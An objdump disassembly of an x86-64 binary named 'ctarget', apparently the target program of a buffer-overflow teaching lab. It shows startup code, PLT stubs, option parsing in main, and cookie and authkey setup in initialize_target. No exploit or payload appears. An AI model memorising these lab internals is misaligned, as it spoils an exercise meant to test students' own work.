
ctarget:     file format elf64-x86-64


Disassembly of section .init:

0000000000400bc8 <_init>:
  400bc8:	48 83 ec 08          	sub    $0x8,%rsp
  400bcc:	48 8b 05 25 34 20 00 	mov    0x203425(%rip),%rax        # 603ff8 <__gmon_start__>
  400bd3:	48 85 c0             	test   %rax,%rax
  400bd6:	74 05                	je     400bdd <_init+0x15>
  400bd8:	e8 33 01 00 00       	callq  400d10 <__gmon_start__@plt>
  400bdd:	48 83 c4 08          	add    $0x8,%rsp
  400be1:	c3                   	retq   

Disassembly of section .plt:

0000000000400bf0 <.plt>:
  400bf0:	ff 35 12 34 20 00    	pushq  0x203412(%rip)        # 604008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400bf6:	ff 25 14 34 20 00    	jmpq   *0x203414(%rip)        # 604010 <_GLOBAL_OFFSET_TABLE_+0x10>
  400bfc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400c00 <strcasecmp@plt>:
  400c00:	ff 25 12 34 20 00    	jmpq   *0x203412(%rip)        # 604018 <strcasecmp@GLIBC_2.2.5>
  400c06:	68 00 00 00 00       	pushq  $0x0
  400c0b:	e9 e0 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c10 <__errno_location@plt>:
  400c10:	ff 25 0a 34 20 00    	jmpq   *0x20340a(%rip)        # 604020 <__errno_location@GLIBC_2.2.5>
  400c16:	68 01 00 00 00       	pushq  $0x1
  400c1b:	e9 d0 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c20 <srandom@plt>:
  400c20:	ff 25 02 34 20 00    	jmpq   *0x203402(%rip)        # 604028 <srandom@GLIBC_2.2.5>
  400c26:	68 02 00 00 00       	pushq  $0x2
  400c2b:	e9 c0 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c30 <strncmp@plt>:
  400c30:	ff 25 fa 33 20 00    	jmpq   *0x2033fa(%rip)        # 604030 <strncmp@GLIBC_2.2.5>
  400c36:	68 03 00 00 00       	pushq  $0x3
  400c3b:	e9 b0 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c40 <strcpy@plt>:
  400c40:	ff 25 f2 33 20 00    	jmpq   *0x2033f2(%rip)        # 604038 <strcpy@GLIBC_2.2.5>
  400c46:	68 04 00 00 00       	pushq  $0x4
  400c4b:	e9 a0 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c50 <puts@plt>:
  400c50:	ff 25 ea 33 20 00    	jmpq   *0x2033ea(%rip)        # 604040 <puts@GLIBC_2.2.5>
  400c56:	68 05 00 00 00       	pushq  $0x5
  400c5b:	e9 90 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c60 <write@plt>:
  400c60:	ff 25 e2 33 20 00    	jmpq   *0x2033e2(%rip)        # 604048 <write@GLIBC_2.2.5>
  400c66:	68 06 00 00 00       	pushq  $0x6
  400c6b:	e9 80 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c70 <mmap@plt>:
  400c70:	ff 25 da 33 20 00    	jmpq   *0x2033da(%rip)        # 604050 <mmap@GLIBC_2.2.5>
  400c76:	68 07 00 00 00       	pushq  $0x7
  400c7b:	e9 70 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c80 <printf@plt>:
  400c80:	ff 25 d2 33 20 00    	jmpq   *0x2033d2(%rip)        # 604058 <printf@GLIBC_2.2.5>
  400c86:	68 08 00 00 00       	pushq  $0x8
  400c8b:	e9 60 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400c90 <memset@plt>:
  400c90:	ff 25 ca 33 20 00    	jmpq   *0x2033ca(%rip)        # 604060 <memset@GLIBC_2.2.5>
  400c96:	68 09 00 00 00       	pushq  $0x9
  400c9b:	e9 50 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400ca0 <alarm@plt>:
  400ca0:	ff 25 c2 33 20 00    	jmpq   *0x2033c2(%rip)        # 604068 <alarm@GLIBC_2.2.5>
  400ca6:	68 0a 00 00 00       	pushq  $0xa
  400cab:	e9 40 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400cb0 <close@plt>:
  400cb0:	ff 25 ba 33 20 00    	jmpq   *0x2033ba(%rip)        # 604070 <close@GLIBC_2.2.5>
  400cb6:	68 0b 00 00 00       	pushq  $0xb
  400cbb:	e9 30 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400cc0 <read@plt>:
  400cc0:	ff 25 b2 33 20 00    	jmpq   *0x2033b2(%rip)        # 604078 <read@GLIBC_2.2.5>
  400cc6:	68 0c 00 00 00       	pushq  $0xc
  400ccb:	e9 20 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400cd0 <__libc_start_main@plt>:
  400cd0:	ff 25 aa 33 20 00    	jmpq   *0x2033aa(%rip)        # 604080 <__libc_start_main@GLIBC_2.2.5>
  400cd6:	68 0d 00 00 00       	pushq  $0xd
  400cdb:	e9 10 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400ce0 <signal@plt>:
  400ce0:	ff 25 a2 33 20 00    	jmpq   *0x2033a2(%rip)        # 604088 <signal@GLIBC_2.2.5>
  400ce6:	68 0e 00 00 00       	pushq  $0xe
  400ceb:	e9 00 ff ff ff       	jmpq   400bf0 <.plt>

0000000000400cf0 <gethostbyname@plt>:
  400cf0:	ff 25 9a 33 20 00    	jmpq   *0x20339a(%rip)        # 604090 <gethostbyname@GLIBC_2.2.5>
  400cf6:	68 0f 00 00 00       	pushq  $0xf
  400cfb:	e9 f0 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d00 <fprintf@plt>:
  400d00:	ff 25 92 33 20 00    	jmpq   *0x203392(%rip)        # 604098 <fprintf@GLIBC_2.2.5>
  400d06:	68 10 00 00 00       	pushq  $0x10
  400d0b:	e9 e0 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d10 <__gmon_start__@plt>:
  400d10:	ff 25 8a 33 20 00    	jmpq   *0x20338a(%rip)        # 6040a0 <__gmon_start__>
  400d16:	68 11 00 00 00       	pushq  $0x11
  400d1b:	e9 d0 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d20 <strtol@plt>:
  400d20:	ff 25 82 33 20 00    	jmpq   *0x203382(%rip)        # 6040a8 <strtol@GLIBC_2.2.5>
  400d26:	68 12 00 00 00       	pushq  $0x12
  400d2b:	e9 c0 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d30 <memcpy@plt>:
  400d30:	ff 25 7a 33 20 00    	jmpq   *0x20337a(%rip)        # 6040b0 <memcpy@GLIBC_2.14>
  400d36:	68 13 00 00 00       	pushq  $0x13
  400d3b:	e9 b0 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d40 <time@plt>:
  400d40:	ff 25 72 33 20 00    	jmpq   *0x203372(%rip)        # 6040b8 <time@GLIBC_2.2.5>
  400d46:	68 14 00 00 00       	pushq  $0x14
  400d4b:	e9 a0 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d50 <random@plt>:
  400d50:	ff 25 6a 33 20 00    	jmpq   *0x20336a(%rip)        # 6040c0 <random@GLIBC_2.2.5>
  400d56:	68 15 00 00 00       	pushq  $0x15
  400d5b:	e9 90 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d60 <_IO_getc@plt>:
  400d60:	ff 25 62 33 20 00    	jmpq   *0x203362(%rip)        # 6040c8 <_IO_getc@GLIBC_2.2.5>
  400d66:	68 16 00 00 00       	pushq  $0x16
  400d6b:	e9 80 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d70 <__isoc99_sscanf@plt>:
  400d70:	ff 25 5a 33 20 00    	jmpq   *0x20335a(%rip)        # 6040d0 <__isoc99_sscanf@GLIBC_2.7>
  400d76:	68 17 00 00 00       	pushq  $0x17
  400d7b:	e9 70 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d80 <munmap@plt>:
  400d80:	ff 25 52 33 20 00    	jmpq   *0x203352(%rip)        # 6040d8 <munmap@GLIBC_2.2.5>
  400d86:	68 18 00 00 00       	pushq  $0x18
  400d8b:	e9 60 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400d90 <bcopy@plt>:
  400d90:	ff 25 4a 33 20 00    	jmpq   *0x20334a(%rip)        # 6040e0 <bcopy@GLIBC_2.2.5>
  400d96:	68 19 00 00 00       	pushq  $0x19
  400d9b:	e9 50 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400da0 <fopen@plt>:
  400da0:	ff 25 42 33 20 00    	jmpq   *0x203342(%rip)        # 6040e8 <fopen@GLIBC_2.2.5>
  400da6:	68 1a 00 00 00       	pushq  $0x1a
  400dab:	e9 40 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400db0 <getopt@plt>:
  400db0:	ff 25 3a 33 20 00    	jmpq   *0x20333a(%rip)        # 6040f0 <getopt@GLIBC_2.2.5>
  400db6:	68 1b 00 00 00       	pushq  $0x1b
  400dbb:	e9 30 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400dc0 <strtoul@plt>:
  400dc0:	ff 25 32 33 20 00    	jmpq   *0x203332(%rip)        # 6040f8 <strtoul@GLIBC_2.2.5>
  400dc6:	68 1c 00 00 00       	pushq  $0x1c
  400dcb:	e9 20 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400dd0 <gethostname@plt>:
  400dd0:	ff 25 2a 33 20 00    	jmpq   *0x20332a(%rip)        # 604100 <gethostname@GLIBC_2.2.5>
  400dd6:	68 1d 00 00 00       	pushq  $0x1d
  400ddb:	e9 10 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400de0 <sprintf@plt>:
  400de0:	ff 25 22 33 20 00    	jmpq   *0x203322(%rip)        # 604108 <sprintf@GLIBC_2.2.5>
  400de6:	68 1e 00 00 00       	pushq  $0x1e
  400deb:	e9 00 fe ff ff       	jmpq   400bf0 <.plt>

0000000000400df0 <exit@plt>:
  400df0:	ff 25 1a 33 20 00    	jmpq   *0x20331a(%rip)        # 604110 <exit@GLIBC_2.2.5>
  400df6:	68 1f 00 00 00       	pushq  $0x1f
  400dfb:	e9 f0 fd ff ff       	jmpq   400bf0 <.plt>

0000000000400e00 <connect@plt>:
  400e00:	ff 25 12 33 20 00    	jmpq   *0x203312(%rip)        # 604118 <connect@GLIBC_2.2.5>
  400e06:	68 20 00 00 00       	pushq  $0x20
  400e0b:	e9 e0 fd ff ff       	jmpq   400bf0 <.plt>

0000000000400e10 <socket@plt>:
  400e10:	ff 25 0a 33 20 00    	jmpq   *0x20330a(%rip)        # 604120 <socket@GLIBC_2.2.5>
  400e16:	68 21 00 00 00       	pushq  $0x21
  400e1b:	e9 d0 fd ff ff       	jmpq   400bf0 <.plt>

Disassembly of section .text:

0000000000400e20 <_start>:
  400e20:	31 ed                	xor    %ebp,%ebp
  400e22:	49 89 d1             	mov    %rdx,%r9
  400e25:	5e                   	pop    %rsi
  400e26:	48 89 e2             	mov    %rsp,%rdx
  400e29:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  400e2d:	50                   	push   %rax
  400e2e:	54                   	push   %rsp
  400e2f:	49 c7 c0 90 2b 40 00 	mov    $0x402b90,%r8
  400e36:	48 c7 c1 20 2b 40 00 	mov    $0x402b20,%rcx
  400e3d:	48 c7 c7 e0 10 40 00 	mov    $0x4010e0,%rdi
  400e44:	e8 87 fe ff ff       	callq  400cd0 <__libc_start_main@plt>
  400e49:	f4                   	hlt    
  400e4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400e50 <deregister_tm_clones>:
  400e50:	b8 b7 44 60 00       	mov    $0x6044b7,%eax
  400e55:	55                   	push   %rbp
  400e56:	48 2d b0 44 60 00    	sub    $0x6044b0,%rax
  400e5c:	48 83 f8 0e          	cmp    $0xe,%rax
  400e60:	48 89 e5             	mov    %rsp,%rbp
  400e63:	77 02                	ja     400e67 <deregister_tm_clones+0x17>
  400e65:	5d                   	pop    %rbp
  400e66:	c3                   	retq   
  400e67:	b8 00 00 00 00       	mov    $0x0,%eax
  400e6c:	48 85 c0             	test   %rax,%rax
  400e6f:	74 f4                	je     400e65 <deregister_tm_clones+0x15>
  400e71:	5d                   	pop    %rbp
  400e72:	bf b0 44 60 00       	mov    $0x6044b0,%edi
  400e77:	ff e0                	jmpq   *%rax
  400e79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400e80 <register_tm_clones>:
  400e80:	b8 b0 44 60 00       	mov    $0x6044b0,%eax
  400e85:	55                   	push   %rbp
  400e86:	48 2d b0 44 60 00    	sub    $0x6044b0,%rax
  400e8c:	48 c1 f8 03          	sar    $0x3,%rax
  400e90:	48 89 e5             	mov    %rsp,%rbp
  400e93:	48 89 c2             	mov    %rax,%rdx
  400e96:	48 c1 ea 3f          	shr    $0x3f,%rdx
  400e9a:	48 01 d0             	add    %rdx,%rax
  400e9d:	48 d1 f8             	sar    %rax
  400ea0:	75 02                	jne    400ea4 <register_tm_clones+0x24>
  400ea2:	5d                   	pop    %rbp
  400ea3:	c3                   	retq   
  400ea4:	ba 00 00 00 00       	mov    $0x0,%edx
  400ea9:	48 85 d2             	test   %rdx,%rdx
  400eac:	74 f4                	je     400ea2 <register_tm_clones+0x22>
  400eae:	5d                   	pop    %rbp
  400eaf:	48 89 c6             	mov    %rax,%rsi
  400eb2:	bf b0 44 60 00       	mov    $0x6044b0,%edi
  400eb7:	ff e2                	jmpq   *%rdx
  400eb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400ec0 <__do_global_dtors_aux>:
  400ec0:	80 3d 11 36 20 00 00 	cmpb   $0x0,0x203611(%rip)        # 6044d8 <completed.6355>
  400ec7:	75 11                	jne    400eda <__do_global_dtors_aux+0x1a>
  400ec9:	55                   	push   %rbp
  400eca:	48 89 e5             	mov    %rsp,%rbp
  400ecd:	e8 7e ff ff ff       	callq  400e50 <deregister_tm_clones>
  400ed2:	5d                   	pop    %rbp
  400ed3:	c6 05 fe 35 20 00 01 	movb   $0x1,0x2035fe(%rip)        # 6044d8 <completed.6355>
  400eda:	f3 c3                	repz retq 
  400edc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400ee0 <frame_dummy>:
  400ee0:	48 83 3d 38 2f 20 00 	cmpq   $0x0,0x202f38(%rip)        # 603e20 <__JCR_END__>
  400ee7:	00 
  400ee8:	74 1e                	je     400f08 <frame_dummy+0x28>
  400eea:	b8 00 00 00 00       	mov    $0x0,%eax
  400eef:	48 85 c0             	test   %rax,%rax
  400ef2:	74 14                	je     400f08 <frame_dummy+0x28>
  400ef4:	55                   	push   %rbp
  400ef5:	bf 20 3e 60 00       	mov    $0x603e20,%edi
  400efa:	48 89 e5             	mov    %rsp,%rbp
  400efd:	ff d0                	callq  *%rax
  400eff:	5d                   	pop    %rbp
  400f00:	e9 7b ff ff ff       	jmpq   400e80 <register_tm_clones>
  400f05:	0f 1f 00             	nopl   (%rax)
  400f08:	e9 73 ff ff ff       	jmpq   400e80 <register_tm_clones>
  400f0d:	0f 1f 00             	nopl   (%rax)

0000000000400f10 <usage>:
  400f10:	48 83 ec 08          	sub    $0x8,%rsp
  400f14:	48 89 fe             	mov    %rdi,%rsi
  400f17:	83 3d ea 35 20 00 00 	cmpl   $0x0,0x2035ea(%rip)        # 604508 <is_checker>
  400f1e:	74 39                	je     400f59 <usage+0x49>
  400f20:	bf b0 2b 40 00       	mov    $0x402bb0,%edi
  400f25:	b8 00 00 00 00       	mov    $0x0,%eax
  400f2a:	e8 51 fd ff ff       	callq  400c80 <printf@plt>
  400f2f:	bf e8 2b 40 00       	mov    $0x402be8,%edi
  400f34:	e8 17 fd ff ff       	callq  400c50 <puts@plt>
  400f39:	bf 60 2d 40 00       	mov    $0x402d60,%edi
  400f3e:	e8 0d fd ff ff       	callq  400c50 <puts@plt>
  400f43:	bf 10 2c 40 00       	mov    $0x402c10,%edi
  400f48:	e8 03 fd ff ff       	callq  400c50 <puts@plt>
  400f4d:	bf 7a 2d 40 00       	mov    $0x402d7a,%edi
  400f52:	e8 f9 fc ff ff       	callq  400c50 <puts@plt>
  400f57:	eb 2d                	jmp    400f86 <usage+0x76>
  400f59:	bf 96 2d 40 00       	mov    $0x402d96,%edi
  400f5e:	b8 00 00 00 00       	mov    $0x0,%eax
  400f63:	e8 18 fd ff ff       	callq  400c80 <printf@plt>
  400f68:	bf 38 2c 40 00       	mov    $0x402c38,%edi
  400f6d:	e8 de fc ff ff       	callq  400c50 <puts@plt>
  400f72:	bf 60 2c 40 00       	mov    $0x402c60,%edi
  400f77:	e8 d4 fc ff ff       	callq  400c50 <puts@plt>
  400f7c:	bf b4 2d 40 00       	mov    $0x402db4,%edi
  400f81:	e8 ca fc ff ff       	callq  400c50 <puts@plt>
  400f86:	bf 00 00 00 00       	mov    $0x0,%edi
  400f8b:	e8 60 fe ff ff       	callq  400df0 <exit@plt>

0000000000400f90 <initialize_target>:
  400f90:	55                   	push   %rbp
  400f91:	53                   	push   %rbx
  400f92:	48 81 ec 08 21 00 00 	sub    $0x2108,%rsp
  400f99:	89 f5                	mov    %esi,%ebp
  400f9b:	89 3d 57 35 20 00    	mov    %edi,0x203557(%rip)        # 6044f8 <check_level>
  400fa1:	8b 3d c1 31 20 00    	mov    0x2031c1(%rip),%edi        # 604168 <target_id>
  400fa7:	e8 47 1b 00 00       	callq  402af3 <gencookie>
  400fac:	89 05 52 35 20 00    	mov    %eax,0x203552(%rip)        # 604504 <cookie>
  400fb2:	89 c7                	mov    %eax,%edi
  400fb4:	e8 3a 1b 00 00       	callq  402af3 <gencookie>
  400fb9:	89 05 41 35 20 00    	mov    %eax,0x203541(%rip)        # 604500 <authkey>
  400fbf:	8b 05 a3 31 20 00    	mov    0x2031a3(%rip),%eax        # 604168 <target_id>
  400fc5:	8d 78 01             	lea    0x1(%rax),%edi
  400fc8:	e8 53 fc ff ff       	callq  400c20 <srandom@plt>
  400fcd:	e8 7e fd ff ff       	callq  400d50 <random@plt>
  400fd2:	89 c7                	mov    %eax,%edi
  400fd4:	e8 ca 02 00 00       	callq  4012a3 <scramble>
  400fd9:	89 c3                	mov    %eax,%ebx
  400fdb:	85 ed                	test   %ebp,%ebp
  400fdd:	74 18                	je     400ff7 <initialize_target+0x67>
  400fdf:	bf 00 00 00 00       	mov    $0x0,%edi
  400fe4:	e8 57 fd ff ff       	callq  400d40 <time@plt>
  400fe9:	89 c7                	mov    %eax,%edi
  400feb:	e8 30 fc ff ff       	callq  400c20 <srandom@plt>
  400ff0:	e8 5b fd ff ff       	callq  400d50 <random@plt>
  400ff5:	eb 05                	jmp    400ffc <initialize_target+0x6c>
  400ff7:	b8 00 00 00 00       	mov    $0x0,%eax
  400ffc:	01 c3                	add    %eax,%ebx
  400ffe:	0f b7 db             	movzwl %bx,%ebx
  401001:	8d 04 dd 00 01 00 00 	lea    0x100(,%rbx,8),%eax
  401008:	89 c0                	mov    %eax,%eax
  40100a:	48 89 05 8f 34 20 00 	mov    %rax,0x20348f(%rip)        # 6044a0 <buf_offset>
  401011:	c6 05 10 41 20 00 63 	movb   $0x63,0x204110(%rip)        # 605128 <target_prefix>
  401018:	83 3d 89 34 20 00 00 	cmpl   $0x0,0x203489(%rip)        # 6044a8 <notify>
  40101f:	0f 84 b1 00 00 00    	je     4010d6 <initialize_target+0x146>
  401025:	83 3d dc 34 20 00 00 	cmpl   $0x0,0x2034dc(%rip)        # 604508 <is_checker>
  40102c:	0f 85 a4 00 00 00    	jne    4010d6 <initialize_target+0x146>
  401032:	be 00 01 00 00       	mov    $0x100,%esi
  401037:	48 89 e7             	mov    %rsp,%rdi
  40103a:	e8 91 fd ff ff       	callq  400dd0 <gethostname@plt>
  40103f:	85 c0                	test   %eax,%eax
  401041:	74 25                	je     401068 <initialize_target+0xd8>
  401043:	bf 90 2c 40 00       	mov    $0x402c90,%edi
  401048:	e8 03 fc ff ff       	callq  400c50 <puts@plt>
  40104d:	bf 08 00 00 00       	mov    $0x8,%edi
  401052:	e8 99 fd ff ff       	callq  400df0 <exit@plt>
  401057:	48 89 e6             	mov    %rsp,%rsi
  40105a:	e8 a1 fb ff ff       	callq  400c00 <strcasecmp@plt>
  40105f:	85 c0                	test   %eax,%eax
  401061:	74 21                	je     401084 <initialize_target+0xf4>
  401063:	83 c3 01             	add    $0x1,%ebx
  401066:	eb 05                	jmp    40106d <initialize_target+0xdd>
  401068:	bb 00 00 00 00       	mov    $0x0,%ebx
  40106d:	48 63 c3             	movslq %ebx,%rax
  401070:	48 8b 3c c5 80 41 60 	mov    0x604180(,%rax,8),%rdi
  401077:	00 
  401078:	48 85 ff             	test   %rdi,%rdi
  40107b:	75 da                	jne    401057 <initialize_target+0xc7>
  40107d:	b8 00 00 00 00       	mov    $0x0,%eax
  401082:	eb 05                	jmp    401089 <initialize_target+0xf9>
  401084:	b8 01 00 00 00       	mov    $0x1,%eax
  401089:	85 c0                	test   %eax,%eax
  40108b:	75 17                	jne    4010a4 <initialize_target+0x114>
  40108d:	48 89 e6             	mov    %rsp,%rsi
  401090:	bf c8 2c 40 00       	mov    $0x402cc8,%edi
  401095:	e8 e6 fb ff ff       	callq  400c80 <printf@plt>
  40109a:	bf 08 00 00 00       	mov    $0x8,%edi
  40109f:	e8 4c fd ff ff       	callq  400df0 <exit@plt>
  4010a4:	48 8d bc 24 00 01 00 	lea    0x100(%rsp),%rdi
  4010ab:	00 
  4010ac:	e8 d9 17 00 00       	callq  40288a <init_driver>
  4010b1:	85 c0                	test   %eax,%eax
  4010b3:	79 21                	jns    4010d6 <initialize_target+0x146>
  4010b5:	48 8d b4 24 00 01 00 	lea    0x100(%rsp),%rsi
  4010bc:	00 
  4010bd:	bf 08 2d 40 00       	mov    $0x402d08,%edi
  4010c2:	b8 00 00 00 00       	mov    $0x0,%eax
  4010c7:	e8 b4 fb ff ff       	callq  400c80 <printf@plt>
  4010cc:	bf 08 00 00 00       	mov    $0x8,%edi
  4010d1:	e8 1a fd ff ff       	callq  400df0 <exit@plt>
  4010d6:	48 81 c4 08 21 00 00 	add    $0x2108,%rsp
  4010dd:	5b                   	pop    %rbx
  4010de:	5d                   	pop    %rbp
  4010df:	c3                   	retq   

00000000004010e0 <main>:
  4010e0:	41 56                	push   %r14
  4010e2:	41 55                	push   %r13
  4010e4:	41 54                	push   %r12
  4010e6:	55                   	push   %rbp
  4010e7:	53                   	push   %rbx
  4010e8:	41 89 fc             	mov    %edi,%r12d
  4010eb:	48 89 f3             	mov    %rsi,%rbx
  4010ee:	be b1 1c 40 00       	mov    $0x401cb1,%esi
  4010f3:	bf 0b 00 00 00       	mov    $0xb,%edi
  4010f8:	e8 e3 fb ff ff       	callq  400ce0 <signal@plt>
  4010fd:	be 63 1c 40 00       	mov    $0x401c63,%esi
  401102:	bf 07 00 00 00       	mov    $0x7,%edi
  401107:	e8 d4 fb ff ff       	callq  400ce0 <signal@plt>
  40110c:	be ff 1c 40 00       	mov    $0x401cff,%esi
  401111:	bf 04 00 00 00       	mov    $0x4,%edi
  401116:	e8 c5 fb ff ff       	callq  400ce0 <signal@plt>
  40111b:	83 3d e6 33 20 00 00 	cmpl   $0x0,0x2033e6(%rip)        # 604508 <is_checker>
  401122:	74 20                	je     401144 <main+0x64>
  401124:	be 4d 1d 40 00       	mov    $0x401d4d,%esi
  401129:	bf 0e 00 00 00       	mov    $0xe,%edi
  40112e:	e8 ad fb ff ff       	callq  400ce0 <signal@plt>
  401133:	bf 05 00 00 00       	mov    $0x5,%edi
  401138:	e8 63 fb ff ff       	callq  400ca0 <alarm@plt>
  40113d:	bd d2 2d 40 00       	mov    $0x402dd2,%ebp
  401142:	eb 05                	jmp    401149 <main+0x69>
  401144:	bd cd 2d 40 00       	mov    $0x402dcd,%ebp
  401149:	48 8b 05 70 33 20 00 	mov    0x203370(%rip),%rax        # 6044c0 <stdin@@GLIBC_2.2.5>
  401150:	48 89 05 99 33 20 00 	mov    %rax,0x203399(%rip)        # 6044f0 <infile>
  401157:	41 bd 00 00 00 00    	mov    $0x0,%r13d
  40115d:	41 be 00 00 00 00    	mov    $0x0,%r14d
  401163:	e9 b9 00 00 00       	jmpq   401221 <main+0x141>
  401168:	83 e8 61             	sub    $0x61,%eax
  40116b:	3c 10                	cmp    $0x10,%al
  40116d:	0f 87 93 00 00 00    	ja     401206 <main+0x126>
  401173:	0f b6 c0             	movzbl %al,%eax
  401176:	ff 24 c5 18 2e 40 00 	jmpq   *0x402e18(,%rax,8)
  40117d:	48 8b 3b             	mov    (%rbx),%rdi
  401180:	e8 8b fd ff ff       	callq  400f10 <usage>
  401185:	be 85 31 40 00       	mov    $0x403185,%esi
  40118a:	48 8b 3d 37 33 20 00 	mov    0x203337(%rip),%rdi        # 6044c8 <optarg@@GLIBC_2.2.5>
  401191:	e8 0a fc ff ff       	callq  400da0 <fopen@plt>
  401196:	48 89 05 53 33 20 00 	mov    %rax,0x203353(%rip)        # 6044f0 <infile>
  40119d:	48 85 c0             	test   %rax,%rax
  4011a0:	75 7f                	jne    401221 <main+0x141>
  4011a2:	48 8b 15 1f 33 20 00 	mov    0x20331f(%rip),%rdx        # 6044c8 <optarg@@GLIBC_2.2.5>
  4011a9:	be da 2d 40 00       	mov    $0x402dda,%esi
  4011ae:	48 8b 3d 1b 33 20 00 	mov    0x20331b(%rip),%rdi        # 6044d0 <stderr@@GLIBC_2.2.5>
  4011b5:	e8 46 fb ff ff       	callq  400d00 <fprintf@plt>
  4011ba:	b8 01 00 00 00       	mov    $0x1,%eax
  4011bf:	e9 d6 00 00 00       	jmpq   40129a <main+0x1ba>
  4011c4:	ba 10 00 00 00       	mov    $0x10,%edx
  4011c9:	be 00 00 00 00       	mov    $0x0,%esi
  4011ce:	48 8b 3d f3 32 20 00 	mov    0x2032f3(%rip),%rdi        # 6044c8 <optarg@@GLIBC_2.2.5>
  4011d5:	e8 e6 fb ff ff       	callq  400dc0 <strtoul@plt>
  4011da:	41 89 c6             	mov    %eax,%r14d
  4011dd:	eb 42                	jmp    401221 <main+0x141>
  4011df:	ba 0a 00 00 00       	mov    $0xa,%edx
  4011e4:	be 00 00 00 00       	mov    $0x0,%esi
  4011e9:	48 8b 3d d8 32 20 00 	mov    0x2032d8(%rip),%rdi        # 6044c8 <optarg@@GLIBC_2.2.5>
  4011f0:	e8 2b fb ff ff       	callq  400d20 <strtol@plt>
  4011f5:	41 89 c5             	mov    %eax,%r13d
  4011f8:	eb 27                	jmp    401221 <main+0x141>
  4011fa:	c7 05 a4 32 20 00 00 	movl   $0x0,0x2032a4(%rip)        # 6044a8 <notify>
  401201:	00 00 00 
  401204:	eb 1b                	jmp    401221 <main+0x141>
  401206:	40 0f be f6          	movsbl %sil,%esi
  40120a:	bf f7 2d 40 00       	mov    $0x402df7,%edi
  40120f:	b8 00 00 00 00       	mov    $0x0,%eax
  401214:	e8 67 fa ff ff       	callq  400c80 <printf@plt>
  401219:	48 8b 3b             	mov    (%rbx),%rdi
  40121c:	e8 ef fc ff ff       	callq  400f10 <usage>
  401221:	48 89 ea             	mov    %rbp,%rdx
  401224:	48 89 de             	mov    %rbx,%rsi
  401227:	44 89 e7             	mov    %r12d,%edi
  40122a:	e8 81 fb ff ff       	callq  400db0 <getopt@plt>
  40122f:	89 c6                	mov    %eax,%esi
  401231:	3c ff                	cmp    $0xff,%al
  401233:	0f 85 2f ff ff ff    	jne    401168 <main+0x88>
  401239:	be 00 00 00 00       	mov    $0x0,%esi
  40123e:	44 89 ef             	mov    %r13d,%edi
  401241:	e8 4a fd ff ff       	callq  400f90 <initialize_target>
  401246:	83 3d bb 32 20 00 00 	cmpl   $0x0,0x2032bb(%rip)        # 604508 <is_checker>
  40124d:	74 25                	je     401274 <main+0x194>
  40124f:	44 3b 35 aa 32 20 00 	cmp    0x2032aa(%rip),%r14d        # 604500 <authkey>
  401256:	74 1c                	je     401274 <main+0x194>
  401258:	44 89 f6             	mov    %r14d,%esi
  40125b:	bf 30 2d 40 00       	mov    $0x402d30,%edi
  401260:	b8 00 00 00 00       	mov    $0x0,%eax
  401265:	e8 16 fa ff ff       	callq  400c80 <printf@plt>
  40126a:	b8 00 00 00 00       	mov    $0x0,%eax
  40126f:	e8 f7 06 00 00       	callq  40196b <check_fail>
  401274:	8b 35 8a 32 20 00    	mov    0x20328a(%rip),%esi        # 604504 <cookie>
  40127a:	bf 0a 2e 40 00       	mov    $0x402e0a,%edi
  40127f:	b8 00 00 00 00       	mov    $0x0,%eax
  401284:	e8 f7 f9 ff ff       	callq  400c80 <printf@plt>
  401289:	48 8b 3d 10 32 20 00 	mov    0x203210(%rip),%rdi        # 6044a0 <buf_offset>
  401290:	e8 87 0b 00 00       	callq  401e1c <stable_launch>
  401295:	b8 00 00 00 00       	mov    $0x0,%eax
  40129a:	5b                   	pop    %rbx
  40129b:	5d                   	pop    %rbp
  40129c:	41 5c                	pop    %r12
  40129e:	41 5d                	pop    %r13
  4012a0:	41 5e                	pop    %r14
  4012a2:	c3                   	retq   

00000000004012a3 <scramble>:
  4012a3:	b8 00 00 00 00       	mov    $0x0,%eax
  4012a8:	eb 11                	jmp    4012bb <scramble+0x18>
  4012aa:	69 c8 09 b7 00 00    	imul   $0xb709,%eax,%ecx
  4012b0:	01 f9                	add    %edi,%ecx
  4012b2:	89 c2                	mov    %eax,%edx
  4012b4:	89 4c 94 d0          	mov    %ecx,-0x30(%rsp,%rdx,4)
  4012b8:	83 c0 01             	add    $0x1,%eax
  4012bb:	83 f8 09             	cmp    $0x9,%eax
  4012be:	76 ea                	jbe    4012aa <scramble+0x7>
  4012c0:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  4012c4:	69 c0 08 36 00 00    	imul   $0x3608,%eax,%eax
  4012ca:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  4012ce:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
